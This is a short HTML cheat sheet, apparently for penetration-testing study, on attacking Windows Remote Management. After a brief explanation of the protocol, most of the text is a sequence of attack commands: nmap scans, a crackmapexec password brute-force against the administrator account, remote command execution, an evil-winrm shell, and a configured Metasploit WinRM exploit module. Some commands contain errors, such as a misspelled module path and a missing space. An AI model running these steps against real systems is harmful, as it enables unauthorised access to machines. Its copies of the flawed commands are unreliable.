<h1>Exploiting WinRM</h1>
<hr>

<ul>
  <li>
    Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to facilitate remote access with Windows systems over HTTP(s).
  </li>
  <li>
    Microsoft implemented WinRM in to Windows in order to make life easier for system administrator.
  </li>
  <li>
    WinRM is typically used in the following ways:
    <ul>
    <li>
      Remotely access and interact with awindows host on a local network.
    </li>
  <li>Remotely access and execute commands on windows systems</li>
  <li>Manage and configure Windows system remotely</li>
    </ul>
  </li>
  <li>WinRM typically uses TCP port 5985 and 5986 (HTTPS). </li>
  <li>WinRM implements access control and security for communication between systems through various forms of authentication.</li>
  <li>We can utillize a utility called "crackmapexec" to perform a brute-force on WinRM in order to identify users and their passwords as well as execute commands on the target system.</li>
  <li>We can also utilize a ruby script called "evil-winrm" to obtain a command shell session on the target system.</li>
</ul>
<hr>
<h2>Pratically</h2>
 <ol>
   <li>nmap -sV {ip}</li>
   <li>nmap -sV -p 5985{ip}</li>
   <li>crackmapexec</li>
   <li>crackmapexec winrm {ip} -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt</li><li>nmap -sV {ip}</li>
<span>Now after bruteforce you have passwrod </span>
   <li>crackmapexec winrm {ip} -u administrator -p password -x "whoami"</li>
   <li>crackmapexec winrm {ip} -u administrator -p password -x "systeminfo"</li>
   <span>Get cmd</span>
   <li>evil-winrm.rb -u administrator -p 'password' -i {ip}</li>
 </ol>
 <hr>
 
 ## Using Metasploit

 <ol>
   <li>service postgresql start && msfconsole</li>
   <li>search winrm_script</li>
   <li>use exploit/windows/windrm/winrm_script_exec</li>
   <li>show options</li>
   <li>set RHOSTS {ip}</li>
   <li>set FORCE_VBS true</li>
   <li>set USERNAME administrator</li>
   <li>set PASSWORD password</li>
   <li>run</li>
 </ol>
